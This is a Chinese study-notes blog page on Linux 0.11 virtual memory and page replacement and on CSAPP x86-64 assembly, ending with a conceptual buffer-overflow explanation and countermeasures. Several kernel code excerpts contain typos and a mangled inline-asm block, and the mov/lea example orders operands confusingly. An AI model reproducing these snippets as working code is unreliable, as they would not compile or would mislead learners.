“内存一外存”的两级存储器的结构，利用局部性原理实现髙速缓存。\n虚拟内存是一种和物理内存一样的东西，每一个字节都有对应的地址。但是有一点与物理内存不同，从它的名字就能看出来，“虚拟”：即实际上并不存在，它只是一种机制，是用程序表示的。它的作用就是让上层程序看起来是内存是分段的，而实际上是分页的，如图\n用户程序使用了一段内存，首先会在虚拟内存上面找到一段空的内存，然后将用户程序使用的内存映射到这段内存上，然后虚拟内存再将这段内存映射到物理内存上\n用户程序使用的逻辑内存经过了两次映射才达到物理内存，第一次映射是段的映射，需要段表；第二次是页的映射，需要页表。\n逻辑地址究竟是如何变成物理地址的呢？\n==逻辑地址是段号+偏移（CS：IP）组成的，首先根据段号在段表中找到虚拟内存的段基址，然后加上偏移得到虚拟地址（即在虚拟内存上面的地址），格式是：页号+偏移。然后根据页号在页表中找到对应的页框号，再加上偏移得到最后的物理地址。实现了逻辑地址与物理地址的对应。也就是重定位操作。==\n二、实现虚拟内存 1.载入内存 内存管理的核心就是内存分配，所以从程序放入内存、使用内存开始 首先为程序分配虚拟内存，将程序中的各段分配到虚拟内存的闲置空间中，然后再将虚拟内存中的各段再分成若干页，映射到物理内存的页框中\n2. 分配虚存、 建段表 创建进程使用的是fork()系统调用，从前面可以知道fork()-\u0026gt;sys_fork-\u0026gt;copy_process\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 在Linux/kernel/fork.c int copy_process(int nr, long ebp...) { ……………… copy_mem(nr,p); //分配虚拟内存 ……………… } int copy_mem(int nr, task_struct *p) { unsigned long new_data_base; new_data_base = nr*0x4000000;\t// nr * 64M set_base(p_\u0026gt;ldt[1], new_data_base);\t// 代码段 ldt(段表) set_base(p-\u0026gt;ldt[2], new_data_base);\t// 数据段 ……………… } 调用fork()，然后调用sys_fork，进入copy_process后，在copy_process中调用copy_men();\ncopy_men()函数就是给该进程在虚拟内存上分配内存空间的， 形参 nr：第nr个进程 p：该进程的pcb\n1 new_data_base = nr*0x4000000;\t// nr * 64M 给该进程在虚拟内存上分配一块64M的内存块。可以看到第0个进程内存区域就是0 ~ 64M，第一个进程64~128M，依次类推，互不重叠。然后将p的ldt[1]和ldt[2]都指向这块内存\nldt[1]和ldt[2]指的是数据段和代码段，数据段和代码段现在在虚拟内存上分配内存、建立段表完成\n3.分配内存、建页表 分配内存、建立页表，还是copy_mem()函数完成的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 int copy_mem(int nr, task_struct *p) { unsigned long old_data_base; old_data_base = get_base(currnet-\u0026gt;ldt[2]); copy_page_tables(old_data_base, new_data_base, data_limit); ……………… } int copy_page_tables(unsigned long from, unsigned long to , long size) { from_dir = (unsigned long *) ((from\u0026gt;\u0026gt;20) \u0026amp; 0xffc); to_dir = (unsigned long * )((to\u0026gt;\u0026gt;20) \u0026amp; 0xffc); size = (unsigned long)(size + 0x3fffff) \u0026gt;\u0026gt; 22; for (; size--\u0026gt;0; from_dir++, to_dir++) { from_page_table=(0xfffff000 \u0026amp; *from_dir); to_page_table = get_free_page(); *to_dir = ((unsigned long) to_page_table) | 7; } } 简单分析：\n1 old_data_base = get_base(currnet-\u0026gt;ldt[2]); 得到当前进程的虚拟内存地址赋给old_data_base，再调用copy_page_tables()函数，\n参数from和to：都是32为虚拟内存地址 from_dir指向一个父进程的页目录项（章） to_dir指向一个子进程的页目录项（章） 32位虚拟地址格式： 1 2 3 from_dir = (unsigned long *) ((from\u0026gt;\u0026gt;20) \u0026amp; 0xffc); //from右移22位得到的是页目录号 ffc00000 -\u0026gt;1111 1111 1100 0000 //这里右移20 并与上0xffc 就是去前10位， size是页目录项数\n1 2 3 4 5 6 7 for (; size--\u0026gt;0; from_dir++, to_dir++) { from_page_table=(0xfffff000 \u0026amp; *from_dir); to_page_table = get_free_page(); //分配一个物理内存页来保存页表,就是在mem_map中找一段没有被用过的内存 *to_dir = ((unsigned long) to_page_table) | 7; } from_dir就是一个指向页目录号的指针，根据这个指针找到每一个页号和对应的页框号,get_free_page()新建一个子进程的页目录表，然后将这个页目录表赋给to_dir,但是to_dir指向的表的内容是空的\nget_free_page()函数：得到一段空闲的空间\n1 2 3 4 5 6 7 8 9 unsigned long get_free_page(void) { register unsigned long _res asm(“ax”); _asm_(“std; repne; scasbnt” “movl %%edx,%%eaxn” “D”(mem_map+PAGIG_PA GES-1)); return _res; } 接下来就是填表,将父进程的页表拷贝到子进程中\n1 2 3 4 5 6 7 8 9 10 for (; nr--\u0026gt;0; from_page_table++, to_page_table++) { this_page = *from_page_table; this_page \u0026amp;= ~2;\t// 设置为只读,父进程子进程共享一个页 *to_page_table = this_page; *from_page_table = this_page; this_page -= LOW_MEN; this-\u0026gt;page \u0026gt;\u0026gt;= 12; mem_map[this_page]++; 这一页被共享了，当其中一个释放，还有其他的在使用，因此要+1 } 做完上面三步，内存情况： 4.重定位 通过逻辑地址找到虚拟地址，通过虚拟地址找到物理地址(MMU自动完成)\n如： 对父进程指向p=0x300， *p=7，父进程就会在通过重定位找到物理地址，然后将7写入\n然后父进程fork()一个子进程，因为公用的是一套页表，并且将页表置位只读，因此子进程指向p=0x300， *p=8时，就会重新申请一段内存，修改页表，然后MMU重新计算，然后执行*p = 8，这样就实现了进程之间的分离。\n总结 虚拟内存的实现\n1.分配段 2.建段表 3.分配页 4.建页表 5.重定位 内存换入与换出 为了保证内存在用户程序看起来是分段，而实际是分页的效果，引入了虚拟内存。对于用户来说，虚拟内存是一个完整的内存，用户可以随意使用该内存，假设为4G，对于用户来说就有4G的空间可以使用，但是真正的物理内存远小于4G。为了实现这一差别，引出了内存换入和换出\n一、内存换入 1.引出换入 从前面我们知道，在内存中段页同时存在 但是实际情况是虚拟内存的大小一般大于物理内存，我们又不得不实现虚拟内存，所以，用换入换出实现这一差别(建立虚拟内存与物理内存的映射)。\n==分段分页的核心是虚拟内存，而要实现虚拟内存，就需要进行内存的换入和换出==\n当要访问某一个段的时候，将该段映射到物理内存中，不向相关的数据可以覆盖。 2.请求调页 先用逻辑地址通过查段表计算出虚拟地址时，再由虚拟地址查页表计算物理地址，当用虚拟地址查页表发现该虚拟地址没有映射，即该页没有载入内存时，需要从磁盘中将该页载入物理内存（请求调页） 逻辑地址CS:IP，首先根据CS在段表中找到对应的基址，加上偏移得到虚拟地址：页号+偏移。然后根据页号在页表中找到对应的页框号，加上偏移得到物理地址。\n但是如果在页表中找不到对应的页号对应的页框地址，就要从磁盘上将这一页换入了。\n换入是利用中断来处理(页错误处理程序)，如果load[addr]的时候，发现addr在页表里面没有对应映射，那么就将中断向量寄存器的某一位置为1，说明有中断产生。然后在中断服务函数里面将addr导入到物理内存中。然后再次执行load[addr]这条语句。\n通过虚拟地址查页表找不到映射的情况称作缺页，发现缺页后就要从磁盘中请求调页，这个过程一般比较长，同时需要进入内核，所以在中断中进行。一旦发生缺页，就进入缺页中断，在中断中请求调页。同时建立虚拟内存的该页与物理内存的映射，当请求调页完成时，映射也建立好了 将某页从磁盘换入到内存的，从中断服务函数开始。cpu有专门的中断会就去查找中断号，然后转去执行该中断服务程序。这些东西是在系统初始化的时候就做好了\n(1)设置中断号\n1 2 3 4 5 6 7 void trap_init(void) { set_trap_gate(14, \u0026amp;page_fault); //设置中断号 } # define set_trap_gate(n, addr) _set_gate(\u0026amp;idt[n], 15, 0, addr); (2)中断处理page fault (3)进入中断要push保留现场，然后调用do_no_page(); 当页不存在时，执行该函数\n1 2 3 page=get_free_page(); bread_page(page, current-\u0026gt;executable-\u0026gt;i_dev, nr); put_page(page, address); 先分配一个空闲页给page，然后将磁盘里面的页读到内存中，调用put_page建立映射，最后再次执行load[addr]\n(4)建立映射put_page 二、内存换出 1.引入换出 由于物理内存大小是有限的，在内存换入多次后，物理内存就会满，因此必须换页，才能腾出空间给新换入的页。\n换页的核心问题是需要选择一页淘汰，换出到磁盘，选择哪一页？类似于进程调度\n2.FIFO算法 即每次缺页的时候就替换掉最开始的那一页（先进先出） 在第一次换D的时候将A换入，但是后面紧跟着又要换入A… 这种算法在这个方面肯定不是最好的算法，因为它没有任何机制保证替换次数尽可能少\n3.MIN算法 选最远（不常用的）将使用的页淘汰， 是最优方案 但是，MIN需要知道将来发生的事，在实际中不可行\n4.LRU算法 选最近最长一段时间没有使用的页淘汰(最近最少使用)\n用过去的历史预测将来，可以通过前面调用的页的顺序来推测未来哪些页是常用的，理论基础就是程序的空间局部性。 实现一：时间戳\n用时间戳来记录每页的访问时间 第一次将A放入页框中，并记录当前时间为1；第二次将B放入页框中，并记录当前时间为2；第三次将C放入页框中，并记录当前时间为3；第四次又是访问A页，更新A页访问时间，第五次访问B页，更新B页访问时间；第六次访问D页，不存在，那么就在A、B、C页中选择一个最早使用的也就是数字最小的替换，即C页。\n理论上算法可行，但是，每次地址访问都需要修改时间戳， 需维护一个全局时钟， 需找到最小值 … 实现代价较大\n这里的关键是维护时机的问题。\n如果不缺页，程序应该是直接通过MMU访问物理地址，内核没有机会进行时间戳或者栈的维护。\n只有在缺页中断的时候内核才有机会接触处理页换出。\n任何在不缺页的时候的数据结构维护都会带来巨大开销\n实现二：页码栈\n每次选择栈底换出 每次地址访问都需要修改栈(修改10次左右栈指针) … 实现代价仍然较大\n5.Clock算法 LRU的近似实现 – 将时间计数变为是和否\n实现这一算法：Second Chance Replacement（再给一次机会）\n具体思想：每页增加一个引用位( R )，每一次访问该页时，就将该位置为1。当发生缺页时用一个指针查看每一页的引用位，如果是1则将其置为0，如果是0就直接淘汰。\n每次访问一页时， 硬件自动设置该位\n选择淘汰页： 扫描该位， 是1时清0， 并继续扫描； 是0时淘汰该页\n这种方法提高了内存的效率，只要维护R位（在PCB中）\n但是，如果缺页很少，可能会出现所以的R为1（在实际中，缺页的情况不会很多；如果缺页很多了，说明内存太小了或者算法不行）\n当发生缺页时，指针转一圈之后将所有的页的引用位都置为0，没找到能替换的，继续转，这时候发现最开始的页引用位为0，将其换出，指针后移\n然后又一段时间没有发生缺页，所有页的引用位都为1，当发生缺页之后，又会将这一轮最开始的页换出，然后指针后移，一段时间之后发生缺页，又会将这一轮最开始的页换出，这不就直接退化为FIFO了吗？\n原因：记录了太长的历史信息\n解决：==定时清除R位==\n再加一个指针用来清除每一页的引用位（这个指针的移动速度要快），可以放在时钟中断里面，定时清除 三、帧frame 现在置换策略有了，但是还有一个问题：给进程分配多少个页框(帧frame)?\n如果分配多，请求调页导致的内存高效利用就没有用。而且内存就那么大，如果每一个进程分配很多的话，跑的进程数量就少了。\n如果分配的少，系统内进程增多，每个进程的缺页率增大，当缺页率大到一定程度，进程就会总等待调页完成，导致cpu利用率降低，这一现象为颠簸(thrashing) 所以，先给进程分配一定数量的页框，如果增加页框能增加cpu利用率，就缓慢增加，如果导致cpu利用率减少，就降低页框分配。当然实际情况下每个进程对应的页框数量肯定是得动态调整的。\n总结 内存的换入与换出大致过程： ","permalink":"https://chance7bin.github.io/posts/basic/os/%E4%B8%89%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","summary":"内存使用与分段 一、内存使用 1.逻辑地址 内存作为计算机的基本组成部分，用来存储程序（指令和数据），内存单元按字节编址、寻址，程序装入到内存后，","title":"三、内存管理"},{"content":"程序编码 代码示例 mstore.c\n1 2 3 4 5 6 long mult2(long, long); void multstore(long x, long y, long *dest){ long t = mult2(x,y); *dest = t; } main.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; void multstore(long, long, long *); int main(){ long d; multstore(2,3,\u0026amp;d); printf(\u0026#34;2 * 3 --\u0026gt; %ld\\n\u0026#34;,d); return 0; } long mult2(long a, long b){ long s = a * b; return s; } 使用gcc编译 1 gcc -Og -o p mstore.c main.c 首先，C预处理器扩展源代码，插入所有用#include 命令指定的文件，并扩展所有用#define 声明指定的宏。其次，编译器产生两个源文件的汇编代码，名字分别为 mstore.s 和 main.s。接下来，汇编器会将汇编代码转化成二进制目标代码文件 p1.o 和 p2.o。目标代码是机器代码的一种形式，它包含所有指令的二进制表示，但是还没有填人全局值的地址。最后，链接器将两个目标代码文件与实现库两数(例如 printf）的代码合并，并产生最终的可执行代码文件(由命令行指示符 -o p 指定的）。可执行代码是我们要考虑的机器代码的第二种形式，也就是处理器执行的代码格式。会在第 7章更详细地介绍这些不同形式的机器代码之间的关系以及链接的过程。\n1 gcc -Og -S mstore.c 产生一个汇编文件mstore.s，但是不做其他进一步的工作。\nmstore.s完整内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 .file\t\u0026#34;mstore.c\u0026#34; .text .globl\tmultstore .type\tmultstore, @function multstore: .LFB0: .cfi_startproc endbr64 pushq\t%rbx .cfi_def_cfa_offset 16 .cfi_offset 3, -16 movq\t%rdx, %rbx call\tmult2@PLT movq\t%rax, (%rbx) popq\t%rbx .cfi_def_cfa_offset 8 ret .cfi_endproc .LFE0: .size\tmultstore, .-multstore .ident\t\u0026#34;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\u0026#34; .section\t.note.GNU-stack,\u0026#34;\u0026#34;,@progbits .section\t.note.gnu.property,\u0026#34;a\u0026#34; .align 8 .long\t1f - 0f .long\t4f - 1f .long\t5 0: .string\t\u0026#34;GNU\u0026#34; 1: .align 8 .long\t0xc0000002 .long\t3f - 2f 2: .long\t0x3 3: .align 8 4: 上面代码中每个缩进去的行都对应于一条机器指令。比如，pushq 指令表示应该将寄存器 %rbx 的内容压人程序栈中。\n如果使用 “-c” 命令行选项，GCC会编译并汇编该代码：\n1 gcc -Og -c mstore.c 这就会产生目标代码文件 mstore.o，它是二进制格式的。\n从中得到一个重要的信息，即机器执行的程序只是一个字节序列，它是对一系列指令的编码。机器对产生这些指令的源代码几乎一无所知。\n查看机器代码文件的内容，反汇编器（disassembler）很有用\n1 objdump -d mstore.o 结果如下：\n1 2 3 4 5 6 7 8 0000000000000000 \u0026lt;multstore\u0026gt;: 0:\tf3 0f 1e fa endbr64 4:\t53 push %rbx 5:\t48 89 d3 mov %rdx,%rbx 8:\te8 00 00 00 00 callq d \u0026lt;multstore+0xd\u0026gt; d:\t48 89 03 mov %rax,(%rbx) 10:\t5b pop %rbx 11:\tc3 retq 生成实际可执行的代码需要对一组目标代码文件运行链接器，而这一组目标代码文件中必须含有一个main函数\n用如下方法生成可执行文件prog\n1 gcc -Og -o p mstore.c main.c ATT与Intel 数据格式 大多数 GCC 生成的汇编代码指令都有一个宇符的后缀，表明操作数的大小，例如，数据传送指令有四个变种：movb(传送字节）、movw(传送宇)、movI(传送双字)和movq(传送四字)。后级‘l’用来表示双字，因为32位数被看成是“长字(1ong word)”。注意，汇编代码也使用后级‘l’来表示 4 字节整数和8字节双精度浮点数。这不会产生歧义，因为浮点数使用的是一组完全不同的指令和寄存器。\n访问信息 寄存器的名字都是以%r开头，不过后面还跟着一些不同的命名规则的名字。\n​\n操作数格式 数据传送指令 源操作数指定的值是一个立即数，存储在寄存器中或者内存中。目的操作数指定一个位置，要么是一个奇存器，要么是一个内存地址。x86-64 加了一条限制，传送指令的两个操作数不能都指向内存位置。将一个值从一个内存位置复制到另一个内存位置需要两条指令——第一条指令将源值加载到寄存器中，第二条将该奇存器值写入目的位置。这些指令的寄存器操作数可以是 16个奇存器有标号部分中的任意一个，寄存器部分的大小必须与指令最后一个字符（b、w、l、q）指定的大小匹配。大多数情况中，MOV 指令只会更新目的操作数指定的那些寄存器字节或内存位置。唯一的例外是movI 指令以寄存器作为目的时，它会把该寄存器的高位4字节设置为0。造成这个例外的原因是 x86-64 采用的惯例，即任何为奇存器生成 32 位值的指令都会把该寄存器的高位部分置成 0。\n补充：当寄存器的名称放在括号中时，使用这个寄存器，不管里面存的是什么，将寄存器中的值当作地址去访问\n图 3-4 中记录的最后一条指令是处理64位立即数数据的。常规的 mova 指令只能以表示为 32 位补码数字的立即数作为源操作数，然后把这个值符号扩展得到 64位的值，放到目的位置。movabsq 指令能够以任意 64 位立即数值作为源操作数，并且只能以寄存器作为目的。\n图3-5和图3-6记录的是两类数据移动指令，在将较小的源值复制到较大的目的时使用。所有这些指令都把数据从源（在奇存器或内存中）复制到目的寄存器。MOVZ 类中的指令把目的中剩余的字节填充为 0，而MOVS 类中的指令通过符号扩展来填充，把源操作的最高位进行复制。可以观察到，每条指令名字的最后两个字符都是大小指示符：第一个字符指定源的大小，而第二个指明目的的大小。\nmovzbl 指令不仅会把 %eax 的高3个字节清零，还会把整个寄存器 %rax 的高4个字节都清零。\n补充：x86-64中的内存引用总是用四字长寄存器给出，例如%rax，哪怕操作数只是一个字节、一个字或是一个双字\nmovb $0xF,(%ebx) 错误：Cannot use %ebx as address register\n补充：何时使用零扩展，何时使用符号扩展： 当窄数据类型为：有符号数据类型时，扩展为宽数据类型时，使用符号扩展。 当窄数据类型为：无符号数据类型时，扩展为宽数据类型时，使用零扩展。\n压入和弹出栈数据（仅适用于8字节的） 将四字压入栈\n1 2 subq $8,%rsp #Decrement stack pointer movq %rbp, (%rsp) #Store %rbp on stack 将四字弹出栈\n1 2 movq (%rsp), %rax #Read %rax from stack addq $8,%rsp #Increment stack pointer 算数和逻辑操作 加载有效地址（允许的伸缩因子1、2、4和8覆盖了所有基本简单数据类型的大小） 加载有效地址（load effective address）指令 leaq 实际上是 mova 指令的变形。它的指令形式是从内存读数据到寄存器，但实际上它根本就没有引用内存。它的第一个操作数看上去是一个内存引用，但该指令并不是从指定的位置读入数据，而是将有效地址写入到目的操作数。在图3-10 中我们用 C语言的地址操作符 \u0026amp;s 说明这种计算。这条指令可以为后面的内存引用产生指针。另外，它还可以简洁地描述普通的算术操作。例如，如果寄存器 %rdx 的值为 x，那么指令 leaq 7（%rdx,%rdx,4)，%rax 将设置寄存器 %rax 的值为 5x+7。编译器经常发现 leaq 的一些灵活用法，根本就与有效地址计算无关。目的操作数必须是一个寄存器。\n一元和二元操作 二元操作的第二个操作数既是源又是目的\n注意：当第二个操作数为内存地址时，处理器必领从内存读出值，执行操作，再把结果写回内存。\n移位操作 移位操作，先给出移位量，然后第二项给出的是要移位的数。可以进行算术和逻辑右移。移位量可以是一个立即数，或者放在单字节寄存器 %cl 中。（这些指令很特别，因为只允许以这个特定的寄存器作为操作数。)原则上来说，1个字节的移位量使得移位量的编码范围可以达到 2^8^-1=255。 x86-64 中，移位操作对w位长的数据值进行操作，移位量是由 %cl 奇存器的低m位决定的，这里2^m^=w。高位会被忽略。所以，例如当奇存器 %cl 的十六进制值为 OxFF 时，指令 salb 会移7位，salw 会移15位，sall 会移31位，而 salq 会移63位。\n特殊的算数操作 乘法指令：\nx86-64 指令集提供了两条不同的 “单操作数” 乘法指令，以计算两个64位值的全128 位乘积——一个是无符号数乘法(mulq)，而另一个是补码乘法(imulq）。这两条指令都要求一个参数必须在奇存器%rax中，而另一个作为指令的源操作数给出。然后乘积存放在奇存器%rdx（高 64 位）和%rax（低 64 位）中。虽然 imulq 这个名字可以用于两个不同的乘法操作，但是汇编器能够通过计算操作数的数目，分辨出想用哪条指令。\n除法指令：\n前面的算术运算表（图3-10）没有列出除法或取模操作。这些操作是由单操作数除法指令来提供的，类似于单操作数乘法指令。有符号除法指令idivq 将寄存器 %rdx（高 64位）和%rax（低 64 位）中的 128 位数作为被除数，而除数作为指令的操作数给出。指令将商存储在奇存器 %rax 中，将余数存储在寄存器 %rdx 中。\n对于大多数 64 位除法应用来说，被除数也常常是一个64位的值。这个值应该存放在%rax中，%rdx 的位应该设置为全0（无符号运算）或者%rax 的符号位（有符号运算）。后面这个操作可以用指令 cqto来完成。这条指令不需要操作数——它隐含读出 %rax 的符号位，并将它复制到 %rdx 的所有位。\n控制 条件码 除了整数奇存器，CPU 还维护着一组单个位的条件码(condition code)寄存器，它们描述了最近的算术或逻辑操作的属性。可以检测这些奇存器来执行条件分支指令。最常用的条件码有：\nCF(carry flag)：进位标志。最近的操作使最高位产生了进位。可用来检查无符号操作的溢出。\nZF(zero flag)：零标志。最近的操作得出的结果为 0。\nSF(sign flag)：符号称志，最近的操作得到的结果为负数。(运算结果最高有效位为1，说明结果是负数，SF会被置为1)\nOF(overflow flag)：溢出标志。最近的操作导致一个补码溢出——正溢出或负溢出。\nleaq指令不改变任何条件码，因为它是用来进行地址计算的。\nCMP指令和TEST指令只设置条件码而不改变任何其他奇存器。(想要的结果最终在%rax中)\nCMP指令根据两个操作数之差来设置条件码。除了只设置条件码而不更新目的寄存器之外，CMP 指令与 SUB 指令的行为是一样的。\nTEST指令的行为与AND指令一样，除了它们只设置条件码而不改变目的寄存器的值。典型的用法是，两个操作数是一样的（例如，testq %rax,%rax 用来检查 %rax 是负数、零，还是正数），或其中的一个操作数是一个掩码，用来指示哪些位应该被测试。 （想要的结果最终在%rax中）\n访问条件码 一条 SET指令的目的操作数是低位单字节寄存器元素(图 3-2)之一，或是一个字节的内存位置，指令会将这个字节设置成0或者1。为了得到一个 32 位或 64 位结果，我们必须对高位清零。\n跳转指令 图 3-15 列举了不同的跳转指令。jmp 指令是无条件跳转。它可以是直接跳转，即跳转目标是作为指令的一部分编码的；也可以是间接跳转，即跳转目标是从寄存器或内存位置中读出的。汇编语言中，直接跳转是给出一个标号作为跳转目标的，例如标号 “.L1”。间接跳转的写法是’*‘ ，后面跟一个操作数指示符，举个例子，指令\njmp *%rax\n用寄存器%rax中的值作为跳转目标，而指令\njmp *(%rax)\n以%rax 中的值作为读地址，从内存中读出跳转目标\n跳转指令的编码 跳转指令有几种不同的编码，但是最常用都是PC相对的(PC-relative)。也就是，它们会将目标指令的地址与紧跟在跳转指令后面那条指令的地址之间的差作为编码。这些地址偏移量可以编码为1、2或4个字节。第二种编码方法是出“绝对”地址，用4个字节直接指定目标。汇编器和链接器会选择适当的跳转目的编码。\n用条件控制来实现条件分支 用条件传送来实现条件分支 循环 1.do-while 2.while **①跳转到中间（jump to middle）：**它执行了一个无条件跳转跳转到循环结尾处的测试，以此来执行初始的测试。\n**②guarded-do：**首先用条件分支，如果初始条件不成立就跳过循环，把代码变换为do-while\n3.for循环 switch语句 switch（开关）语句可以根据一个整数索引值进行多重分支（multiway branching）。在处理具有多种可能结果的测试时，这种语句特别有用。它们不仅提高了 C 代码的可读性，而且通过使用跳转表（jump table）这种数据结构使得实现更加高效。跳转表是一个数组， 表项i是一个代码段的地址，这个代码段实现当开关索引值等于i时程序应该采取的动作。程序代码用开关索引值来执行一个跳转表内的数组引用，确定跳转指令的目标。和使用一组很长的 if-else 语句相比，使用跳转表的优点是执行开关语句的时间与开关情况的数量无关。GCC 根据开关情况的数量和开关情况值的稀疏程度来翻译开关语句。当开关情况数量比较多（例如4个以上），并且值的范围跨度比较小时，就会使用跳转表。\n\u0026amp;\u0026amp;：创建一个指向代码位置的指针。\n过程 mov和lea的区别 lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数，例如： lea [ebx+8],eax 就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。\n而mov指令则恰恰相反，例如： mov [ebx+8],eax 则是把内存地址为ebx+8处的数据赋给eax。\n栈帧 栈上用于特定call的每个内存块称为栈帧\n每一次函数的调用，都会在调用栈（call stack）上维护一个独立的栈帧（stack frame）\n每个独立的栈帧一般包括:\n函数的返回地址和参数\n临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量\n函数调用的上下文\n栈是从高地址向低地址延伸，一个函数的栈帧用 %rbp 和 %rsp 这两个寄存器来划定范围。%rbp 指向当前的栈帧的底部，%rsp 始终指向栈帧的顶部;\n%rbp 寄存器又被称为帧指针(Frame Pointer);\n%rspesp 寄存器又被称为栈指针(Stack Pointer);\nret 执行ret，ret指令将始终采用栈指针指向的地址并将它作为返回地址。所以%rsp在你执行ret之前就恢复到它原来的位置是非常重要的。\n1 2 3 4 subq $16, %rsp ... addq $16, %rsp ret 在不同的函数里寄存器是共享的，而内存是隔离的 运行时栈 转移控制 将控制从函数P转移到函数Q只需要简单地把程序计数器(PC)设置为Q的代码的起始位置。不过，当稍后从Q返回的时候，处理器必须记录好它需要继续P的执行的代码位置。在x86-64 机器中，这个信息是用指令 call Q调用过程Q来记录的。该指令会把地址A压入栈中，并将PC设置为Q的起始地址。**压入的地址A被称为返回地址，是紧跟在call指令后面的那条指令的地址。**对应的指令ret会从栈中弹出地址A，并把PC设置为 A。下表给出的是call和ret指令的一般形式：\n数据传送 如果一个函数有大于6个整型参数，超出 6个的部分就要通过栈来传递：把参数 1~6 复制到对应的奇存器，把参数7~n放到栈上，而参数7位于栈顶。\n栈上的局部存储 到目前为止我们看到的大多数过程示例都不需要超出寄存器大小的本地存储区域。不过有些时候，局部数据必须在放在内在中，常见的情况包括：\n寄存器不足够存放所有的本地数据。\n对一个局部变量使用地址运算符‘\u0026amp;’，因此必须能够为它产生一个地址。\n某些局部变量是数组或结构，因此必领能够通过数组或结构引用被访问到。\n一般来说，过程通过减小栈指针在栈上分配空间。分配的结果作为栈帧的一部分，标号为 “局部变量”\n寄存器中的局部存储空间 根据惯例，寄存器%rbx、%rbp 和%r12～%r15 被划分为被调用者保存寄存器。当过程 P调用过程Q时，Q必须保存这些寄存器的值，保证它们的值在Q返回到P时与Q被调用时是一样的。过程Q保存一个寄存器的值不变，要么就是根本不去改变它，要么就是把原始值压人栈中，改变奇存器的值，然后在返回前从栈中弹出旧值。压人寄存器的值会在栈帧中创建标号为“被保存的寄存器”的一部分，如图 3-25 中所示。有了这条惯例，P的代码就能安全地把值存在被调用者保存寄存器中(当然，要先把之前的值保存到栈上），调用Q，然后继续使用寄存器中的值，不用担心值被破坏。\n数组分配和访问 基本原则 X86-64 的内存引用指令可以用来简化数组访问。例如，假设 E 是一个 int 型的数组，而我们想计算 E[i]，在此，E的地址存放在寄存器％rdx 中，而 i 存放在寄存器％rcx 中。然后，指令\n1 movl (%rdx,%rcx,4),%eax 会执行地址计算 x~e~ + 4i 读这个内存位置的值，并将结果存放到寄存器 ％eax 中。允许的伸缩因子 1、2、4 和 8 覆盖了所有基本简单数据类型的大小。\n指针运算 嵌套的数组 这里，L 是数据类型 T 以字节为单位的大小。\n正如可以看到的那样，这段代码计算元素的地址为 x~A~ + 12i + 4j = x~A~ + 4(3i +j)，使用了X86-64地址运算的伸缩和加法特性。\n定长数组 变长数组 异质的数据结构 结构 联合 不怎么用\n数据对齐 许多计算机系统对基本数据类型的合法地址做出了一些限制，要求某种类型对象的地址必须是某个值 K（通常是 2、4 或 8）的倍数。\n如果一个结构体的成员按照不同顺序声明，可能会得到不同大小的alignment（为了内存对齐）\n如果只是把最大的东西放在开头，再依次放更小的元素，能够最大限度地减少任何浪费的空间\n对于结构体来说：\n每个结构都有对齐要求 K （K=任何元素的最大对齐）\n初始地址和结构长度必须是 K 的倍数\n（结构体中的）双精度数，它应该位于一个边界上，这样浮点数的起始地址是8的倍数\n内存、缓冲区 内存越界引用和缓冲区溢出 内存结构 00007FFFFFFFFFFF = 111 1111( * 11) = 2^47^ = 128TB\n缓冲区溢出 缓冲区是一块连续的计算机内存区域，可保存相同数据类型的多个实例。缓冲区可以是堆栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。在C/C++语言中，通常使用字符数组和malloc/new之类内存分配函数实现缓冲区。溢出指数据被添加到分配给该缓冲区的内存块之外。缓冲区溢出是最常见的程序缺陷。\n栈帧结构的引入为高级语言中实现函数或过程调用提供直接的硬件支持，但由于将函数返回地址这样的重要数据保存在程序员可见的堆栈中，因此也给系统安全带来隐患。若将函数返回地址修改为指向一段精心安排的恶意代码，则可达到危害系统安全的目的。此外，堆栈的正确恢复依赖于压栈的EBP值的正确性，但EBP域邻近局部变量，若编程中有意无意地通过局部变量的地址偏移窜改EBP值，则程序的行为将变得非常危险。\n由于C/C++语言没有数组越界检查机制，当向局部数组缓冲区里写入的数据超过为其分配的大小时，就会发生缓冲区溢出。攻击者可利用缓冲区溢出来窜改进程运行时栈，从而改变程序正常流向，轻则导致程序崩溃，重则系统特权被窃取。\n例如，对于下图的栈结构：\n若将长度为16字节的字符串赋给acArrBuf数组，则系统会从acArrBuf[0]开始向高地址填充栈空间，导致覆盖EBP值和函数返回地址。若攻击者用一个有意义的地址(否则会出现段错误)覆盖返回地址的内容，函数返回时就会去执行该地址处事先安排好的攻击代码。最常见的手段是通过制造缓冲区溢出使程序运行一个用户shell，再通过shell执行其它命令。若该程序有root或suid执行权限，则攻击者就获得一个有root权限的shell，进而可对系统进行任意操作。\n除通过使堆栈缓冲区溢出而更改返回地址外，还可改写局部变量(尤其函数指针)以利用缓冲区溢出缺陷。\n注意，本文描述的堆栈缓冲区溢出不同于广义的“堆栈溢出(Stack OverFlow)”，后者除局部数组越界和内存覆盖外，还可能由于调用层次太多(尤其应注意递归函数)或过大的局部变量所导致。\n数据读写 数据从内存要写入磁盘中时，数据会被先写入到磁盘缓冲区，磁盘缓冲区满了再把数据写入磁盘。\n磁盘缓冲区是为了平滑不同I/O设备的速度差。\n是的，磁盘是分区分块存储的。如果是机械硬盘，是分磁道和扇区的。当磁头转到一个扇区的某磁道时，开始读取数据，如果只读取了 100KB 的数据，这时操作系统就想，磁头转到这儿看不容易啊，反正来都来了，顺带多读点数据吧，万一用的着呢。\n所以，读取数据的时候也是通过缓冲区的。\n题外话：如果应用的数据存放在不同的磁道，不同的扇区，那么读取的效率是很低的，这被称为磁盘碎片，所以 windows 有个操作叫“整理磁盘碎片”。\n对抗缓冲区溢出攻击 1.栈随机化\n2.栈破坏检测\n3.限制可执行代码区域\n许多系统允许控制三种访问形式：读（从内存读数据），写（存储数据到内存）和执行（将内存的内容看作机器级代码）。以前，x86 